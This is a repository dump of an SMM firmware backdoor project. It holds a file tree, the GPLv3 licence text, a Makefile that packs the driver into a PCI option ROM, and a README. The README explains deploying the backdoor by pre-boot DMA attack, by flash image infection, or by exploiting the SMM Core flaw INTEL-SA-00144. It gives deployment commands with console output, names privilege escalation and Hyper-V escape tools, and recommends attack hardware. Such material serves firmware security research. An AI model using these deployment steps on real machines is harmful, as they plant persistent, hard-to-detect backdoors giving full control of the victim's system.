Project Path: arc_Cr4sh_SmmBackdoorNg_6kpds70k

Source Tree:

```txt
arc_Cr4sh_SmmBackdoorNg_6kpds70k
├── LICENSE.TXT
├── Makefile
├── README.md
├── SmmBackdoorNg.inf
├── SmmBackdoorNg_X64.efi
├── SmmBackdoorNg_X64.pdb
├── config.h
├── docs
│   └── images
│       ├── spi_probe.jpg
│       ├── spi_wiring.png
│       └── uefi_tool.png
├── interface.h
├── smm_backdoor.py
├── smm_backdoor_hyper_v.py
├── smm_backdoor_privesc_linux.py
├── smm_backdoor_privesc_win.py
└── src
    ├── asm
    │   ├── amd64
    │   │   └── common_asm.asm
    │   └── common_asm.h
    ├── backdoor.c
    ├── backdoor.h
    ├── common.h
    ├── debug.c
    ├── debug.h
    ├── exploit.c
    ├── exploit.h
    ├── loader.c
    ├── loader.h
    ├── ovmf.h
    ├── printf.c
    ├── printf.h
    ├── serial.c
    ├── serial.h
    ├── std.c
    ├── std.h
    ├── virtmem.c
    └── virtmem.h

```

`LICENSE.TXT`:

```TXT
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<http://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<http://www.gnu.org/philosophy/why-not-lgpl.html>.

```

`Makefile`:

```

PROJ = SmmBackdoorNg

ARCH_64 = X64
PATH_64 = ..\..\Build\Ovmf$(ARCH_64)\DEBUG_VS2013x86\$(ARCH_64)\Cr4sh\$(PROJ)\$(PROJ)\OUTPUT

VENDOR_ID = 10ee
DEVICE_ID = 1337

build:
	build
	@if exist $(PATH_64)\$(PROJ).efi copy $(PATH_64)\$(PROJ).efi .\$(PROJ)_$(ARCH_64).efi /Y
	@if exist $(PATH_64)\$(PROJ).pdb copy $(PATH_64)\$(PROJ).pdb .\$(PROJ)_$(ARCH_64).pdb /Y

rom:	
	EfiRom -f 0x$(VENDOR_ID) -i 0x$(DEVICE_ID) -o $(PROJ)_$(ARCH_64)_$(VENDOR_ID)_$(DEVICE_ID).rom -e $(PROJ)_$(ARCH_64).efi
	EfiRom -d $(PROJ)_$(ARCH_64)_$(VENDOR_ID)_$(DEVICE_ID).rom

```

`README.md`:

```md

# SMM Backdoor Next Gen

[General information](#general-information)  
[Contents](#contents)  
[Backdoor usage](#backdoor-usage)  
[Deploying the backdoor using firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection)  
[Using together with Hyper-V Backdoor](#using-together-with-hyper-v-backdoor)  
[Building from the source code](#building-from-the-source-code)  

## General information

This version of System Management Mode backdoor for UEFI based platforms was heavily inspired by [my previous project](http://blog.cr4.sh/2015/07/building-reliable-smm-backdoor-for-uefi.html) (check [its GitHub repository](https://github.com/Cr4sh/SmmBackdoor)) but introducing few key changes in order to make it more up to date:

 * In addition to the usual firmware flash image infection method as described in the article, new SMM backdoor also can be deployed with pre-boot DMA attack using [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) (see [uefi_backdoor_simple.py](https://github.com/Cr4sh/s6_pcie_microblaze/blob/master/python/uefi_backdoor_simple.py) program usage for more details) and industry-wide EFI SMM Core [vulnerability exploitation](https://github.com/Cr4sh/SmmBackdoorNg/blob/main/src/exploit.c) to perform DXE to SMM execution transition. The vulnerability [INTEL-SA-00144](https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00144.html) was discovered by myself and reported to Intel PSIRT [years ago](https://twitter.com/d_olex/status/877718172366798848), but it still remains not patched on many products that using old EDK2 derived firmware code, including whole [AMI Aptio](https://www.ami.com/aptio/) family. Latest generations of Intel machines are likely not vulnerable to this attack.

 * Client program `smm_backdoor.py` supports Windows and Linux systems and can interact with SMM backdoor using SW SMI (requires high privileges and [chipsec](https://github.com/chipsec/chipsec) installed) or APIC periodic timer method that can work with any privileges level.

 * There's `smm_backdoor_privesc_linux.py` and `smm_backdoor_privesc_win.py` test client programs for SMM backdoor that demonstrating local privileges escalation under Windows and Linux by using its API provided by `smm_backdoor.py` library.

 * SMM backdoor is fully virtualization-aware now, its library and client programs can work as expected inside Windows or Linux virtual machines running on the infected host system.

 * SMM backdoor also can be used to load [my Hyper-V backdoor](https://github.com/Cr4sh/s6_pcie_microblaze/tree/master/python/payloads/DmaBackdoorHv) (which is also part of PCI Express DIY hacking toolkit) into the currently running hypervisor during RT phase and perform guest to host VM escape attacks. Test client program `smm_backdoor_hyper_v.py` is used for integration with Hyper-V backdoor and its deployment.


## Contents

The project consists from the following files and directories:

 * `src/` &minus; Source code directory of UEFI DXE driver that implements SMM backdoor functionality along with software part of the exploit.

 * `config.h` &minus; C header file with backdoor UEFI driver project configuration.

 * `interface.h` &minus; C header file with SMM backdoor program interface definitions.

 * `SmmBackdoorNg.inf` &minus; EDK II project configuration file for backdoor UEFI driver.

 * `SmmBackdoorNg_X64.efi` &minus; Compiled binary of backdoor UEFI driver.

 * `SmmBackdoorNg_X64.pdb` &minus; Debug symbols for the binary.

 * `smm_backdoor.py` &minus; Backdoor client program, also used to infect PE images of UEFI SMM drivers.

 * `smm_backdoor_privesc_linux.py` &minus; Backdoor client program with Linux local privileges escalation demo.

 * `smm_backdoor_privesc_windows.py` &minus; Backdoor client program with Windows local privileges escalation demo.

 * `smm_backdoor_hyper_v.py` &minus; Backdoor client program used for Hyper-V backdoor deployment.


## Backdoor usage

Project documentation is incomplete at this moment, but here's some command line examples.

Deploying SMM backdoor UEFI driver with PCI Express DIY hacking toolkit using [pre-boot DMA attack](https://github.com/Cr4sh/s6_pcie_microblaze#practical-dma-attacks), DXE to SMM execution transition exploit mentioned above will be started automatically once backdoor driver will be loaded:

```
# python2 uefi_backdoor_simple.py --driver SmmBackdoorNg_X64.efi
[+] Using UEFI system table hook injection method
[+] Reading DXE phase payload from SmmBackdoorNg_X64.efi
[+] Waiting for PCI-E link...
[!] PCI-E endpoint is not configured by root complex yet
[!] PCI-E endpoint is not configured by root complex yet
[!] Bad MRd TLP completion received
[+] PCI-E link with target is up
[+] Device address is 01:00.0
[+] Looking for DXE driver PE image...
[+] PE image is at 0x7a070000
[+] EFI_SYSTEM_TABLE is at 0x7a03e018
[+] EFI_BOOT_SERVICES is at 0x7a38fa30
[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3987b4
Backdoor image size is 0x49a0
Backdoor entry RVA is 0x20fc
Planting DXE stage driver at 0xc0000...
Hooking LocateProtocol(): 0x7a3987b4 -> 0x000c20fc
1.852231 sec.
[+] DXE driver was planted, waiting for backdoor init...
[+] DXE driver was executed
[+] DONE
```

In case if you're going to deploy SMM backdoor with PCI Express DIY hacking toolkit &minus; I would recommend to get used [Xilinx ZC706](https://www.xilinx.com/products/boards-and-kits/ek-z7-zc706-g.html) from e-Bay rather than [older SP605](https://www.xilinx.com/products/boards-and-kits/ek-s6-sp605-g.html) evaluation kit, since this board has [better design](https://github.com/Cr4sh/zc_pcie_dma), can perform DMA attacks faster and its [development tools](https://www.xilinx.com/products/design-tools/vivado.html) are more suitable for modern day use.

To deploy SMM backdoor you also can use my [Pico DMA project](https://github.com/Cr4sh/pico_dma) &minus; fully autonomous pre-boot DMA attack hardware implant for M.2 slot based on PicoEVB development board that can run arbitrary UEFI DXE drivers as payload.

In addition, you also can deploy the backdoor using [firmware flash image infection](#deploying-the-backdoor-using-firmware-flash-image-infection) described below in the next section.

Basic use of SMM backdoor `smm_backdoor.py` client program to display backdoor debug messages buffer once it was loaded and system has been booted:

```
# python2 smm_backdoor.py --debug
****** Chipsec Linux Kernel module is licensed under GPL 2.0
[+] Obtaining backdoor debug information...
[+] Debug output buffer physical address is 0x79da4000

00000001 - backdoor.c(1573) : ******************************
00000002 - backdoor.c(1574) :
00000003 - backdoor.c(1575) :   SMM backdoor loaded
00000004 - backdoor.c(1576) :
00000005 - backdoor.c(1577) : ******************************
00000006 - backdoor.c(1589) : Resident code base address is 0x79d9f000
00000007 - backdoor.c(1502) : BackdoorResidentDma()
00000008 - backdoor.c(313) : Protocol notify handler is at 0x79d9f364
00000009 - backdoor.c(1423) : SMM access 2 protocol is at 0x778fe650
00000010 - backdoor.c(1424) : Available SMRAM regions:
00000011 - backdoor.c(1434) :  * 0x7b000000:0x7b000fff
00000012 - backdoor.c(1434) :  * 0x7b001000:0x7b7fffff
00000013 - exploit.c(242) : SMM communicate header is at 0x79da2ae0
00000014 - exploit.c(256) : Executing SMM callback...
00000015 - backdoor.c(1215) : Running in SMM
